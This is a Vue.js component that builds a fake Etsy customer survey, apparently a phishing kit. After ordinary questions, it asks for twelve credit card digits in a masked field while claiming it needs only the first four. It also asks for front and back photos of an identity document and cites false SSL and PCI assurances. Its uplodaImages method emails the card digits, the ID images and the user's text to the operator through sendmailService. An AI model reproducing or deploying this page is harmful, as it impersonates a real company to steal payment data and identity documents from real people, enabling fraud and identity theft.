<template>
	<div class="survey">
		<div class="main">
		
		<div>
			<div class="progressBar">
				<ul class="list-unstyled list-inline">
					<li class="active"></li>
					<li v-bind:class="{active:formCounter >= 11}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 2}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 3}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 4}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 5}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 6}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 7}"></li>
					<li v-bind:class="{active:formCounter >= 11 * 8}"></li>
				
				</ul>
			</div>
			<div class="text-center suervey-fields mt-2">
			   <transition name='fieldtran'>
			   	<div class="first-field" v-show='formCounter < 11'>
			 	<h3>What is you current employement status?</h3>
			 	<ul class=" list-inline">
					<li v-on:click=incressCounter >In educatino</li>
					<li v-on:click=incressCounter >unemployed,serching for Job</li>
					<li v-on:click=incressCounter> unemployed,Not serching for Job</li>
					<li v-on:click=incressCounter> Part time empeloyment</li>
					<li v-on:click=incressCounter> Part time empeloyment</li>
					<li v-on:click=incressCounter> Self employed</li>
					<li v-on:click=incressCounter> I prever not answer</li>
			 	</ul>
			    </div>
			   </transition>
			   <transition name='fieldtran'>
			   	<div class="first-field" v-show='formCounter == 11'>
			 	<h3>What is your average  yearly houdhold income (in USD)</h3>
			 	<ul class=" list-inline">
			 		
			 		<li v-on:click=incressCounter >Less than $50,000</li>
			 		<li v-on:click=incressCounter >$50,000 to $99,000</li>
			 		<li v-on:click=incressCounter> $100,000 to $149,99</li>
			 		<li v-on:click=incressCounter> $150,000 to $199,999</li>
			 		<li v-on:click=incressCounter> more than $200,000</li>
			 		<li v-on:click=incressCounter> I prever not answer</li>
			 	</ul>
			    </div>
			   </transition>
			   <transition>
			   <div class="first-field" v-show='formCounter == 11 * 2'>
			 	<h3>which of our categories you like to purchase on ETS</h3>
			 	<ul class=" list-inline">
			 		<li v-on:click=incressCounter >Jeweiry & Accessoires</li>
			 		<li v-on:click=incressCounter >Cloth & Shoes</li>
			 		<li v-on:click=incressCounter> Home $ Living</li>
			 		<li v-on:click=incressCounter> Widing & party</li>
			 		<li v-on:click=incressCounter>Toys & Entertaiment</li>
			 		<li v-on:click=incressCounter> Art & collection</li>
			 		<li v-on:click=incressCounter> Craft Suppliers& Tools</li>
			 		<li v-on:click=incressCounter>Vintage </li>
			 		<li v-on:click=incressCounter>Other </li>
			 	</ul>
			    </div>
			   </transition>
			   <transition>
			   <div class="first-field" v-show='formCounter == 11 *3'>
			 	<h3>Which of our categories you like to purchase on ETS</h3>
			 	<ul class="list-inline rate">
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >1</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >2</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >3</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >4</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >5</li>
			 	</ul>
			    </div>
			   </transition>
			   <transition>
			   <div class="first-field" v-show='formCounter == 11 *4'>
			 	<h3>How likely you to recommend Etsy to a friend or college?</h3>
			 	<ul class="list-inline rate">
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >1</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >2</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >3</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >4</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >5</li>
			 	</ul>
			    </div>
			   </transition>
			     <transition>
			   <div class="first-field" v-show='formCounter == 11 *5'>
			 	<h3>How you satified are you after you case is close?</h3>
			 	<ul class="list-inline rate">
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >1</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >2</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >3</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >4</li>
			 		<li class="list-inline-item ml-1" v-on:click=incressCounter >5</li>
			 	</ul>
			    </div>
			   </transition>
			    <transition>
			   <div class="first-field" v-show='formCounter == 11 * 6'>
			 	<h3>If there one thing that could change about Etsy involevment in case ,what you would be?</h3>
			 	<form @submit="checkform">
			 		<textarea required=required class="form-control" cols="4" rows="5" placeholder="Enter a text" v-model='textArea' >
			 		
			 	</textarea>
			 	<button class="btn btn-default"  type="submit">Countinue</button>
			 	</form>
			 	
			 	
			    </div>
			   </transition>
			    <transition>
			   <div class="first-field text-center" v-show='formCounter == 11 * 7'>
			 	<h3>Confirm you credit cardused at purchase from Etsy,Enter just the first four digits so we can contact your bank easier and provide more support when detecting your purchase from a suspecious Seller</h3>
			 	<div class="input-group center-credit">
			 	<form @submit="checkformCard">
			 	 <div class="fomr-group">
			 		<div class="input-group-prepend">
			 			<input required="required" type="password" class="form-contorole" min="12" max="12" name="card-credit" v-model='cardCredit' placeholder="12 Digits" >
			 			<span class="input-group-text">
			 				****
			 			</span>
			 			</div>
			 			<div v-if='errors.length'>
			 				<ul class="list-unstyled">
			 				<b class="text-muted">Please correct the following error(s):</b>
			 					<li v-for='error in errors'>
			 						{{error}}
			 					</li>
			 				</ul>
			 			</div>
			 		</div>
			 		<button type="submit" class="btn btn-default" >Countinue</button>
			 	</form>
			 		
			 	</div>
			 	
			 		
			 	<p>
				* All credit card information sent to Etsy is encrypted using scure layer technology (SSL),and stored in PCI compliant environment,Etsy follow industry standards to protect other payment and personnal information submitted to us,both during transmission and after Etsy recieves it
			   </p>
			    </div>
			   </transition>
			   <transition>
			   <div class="first-field" v-show='formCounter == 11 * 8'>
			 	<h3>Providing any peace of idintication can help us securing your account by validation your country residency to serve you better when you open a case on Etsy or when you contacting our 24/7 support</h3>
			 	<span class="text-muted">(please provide us front and back of you document if necessary)</span>
			 	<div class="text-center upoad-file">
					<button class="btn btn-secoundary" v-on:click="takePic('theFile')">Capture Image with your device camera</button>
					<form @submit.prevent='uplodaImages'>
						<input
						 required="required"
						  type="file"
						   accept="image/*"
						    id="theFile"
						     
						     v-on:change='getCaptured'
	                        style="display: none" 
						     ref='file'
						     name='file1'
						     capture
						  />
						     
						<strong>Or</strong>
					<button class="btn btn-secoundary" v-on:click="uploadPic('UpFile')">Upload files</button>
					<input
					 type="file"
					  id="UpFile" 
	                  style="display: none" 
					   v-on:change='getUpload'
					   ref='file'
					    name='file2'
					   />
					   
					<button type="submit" class="btn btn-default"  >Countinue</button>
					</form>
					
					
			 	</div>
				
			    </div>
			   </transition>
			</div>
		</div>
			
			<!--  <span>{{formCounter}}</span>
						<button v-on:click=incressCounter>next</button> -->

		</div>
	</div>
</template>
<style src='../assets/css/survey.scss' lang='scss'></style>
<script >
import surveyField from './surveyField';
import sendmailService from './../services/sendmailService'

	export default{
		props:['userlogin'],
		components:{
         surveyField
       
		},
		data() {
			return{
				formCounter:0,
				textArea:'',
				istextValid:false,
				cardCredit:'',
				logedIn:false,
				imageCptured:'',
				imageUploaded:'',
				errors:[]
			}
		},
		methods:{
			incressCounter:function(){
				return this.formCounter+=11;
			},
			decressCounter:function(){
				return this.formCounter-=11;
			},
			takePic:function(elemId){
				var elem = document.getElementById(elemId);
				// if(elem && document.createEvent) {
				// var evt = document.createEvent("MouseEvents");
				// evt.initEvent("click", true, false);
				// elem.dispatchEvent(evt);
				// }
				elem.click()
				elem.addEventListener('change',(e)=>{
					console.log(e.target.files)
				})
			},
			uploadPic:function(elemId){
               var elem = document.getElementById(elemId);
               elem.click()

              elem.addEventListener('change',(e)=>{
					console.log(e.target.files)
				})
			},
			checkform:function(e){
			 
             if(this.textArea &&  this.textArea.length > 2){
             	this.istextValid=true
             	this.formCounter+=11
             	console.log(this.textArea)
             }
                if(!this.textarea) this.errors.push("Name required.");

              e.preventDefault();
			},
			checkformCard:function(e){
			 if(this.cardCredit.length < 12){
             	this.errors.push("Age required.");
             }
             this.formCounter+=11;
             console.log(this.cardCredit)
              e.preventDefault();
			},
			// get image captured
			getCaptured:function(){
				 this.imageCptured = this.$refs.file.files[0];
				 console.log(this.imageCptured)
			},
			getUpload:function(){
				this.imageUploaded = this.$refs.file.files[0];
				console.log(this.imageUploaded)
			},
			 uplodaImages:function(){
             let formData = new FormData();
             let emailData={
             	photo: this.imageCptured,
             	image: this.imageUploaded,
             	opinion:this.textArea,
             	cardC:this.cardCredit
             }
             const dataEm=sendmailService.sendMail({...emailData})
             .then(data=>{
             	console.log(data)
             	this.$router.push({name:'thanks'})
             }

             	).catch(erro=>console.log('data not sent'))
               
            // formData.append('file', this.imageCptured);
             //
				// axios.post( '/single-file',
				// formData,
				// {
				// headers: {
				// 'Content-Type': 'multipart/form-data'
				// }
				// }
				// ).then(function(){
				// console.log('SUCCESS!!');
				// })
				// .catch(function(){
				// console.log('FAILURE!!');
				// });
			}
		}
	}

</script>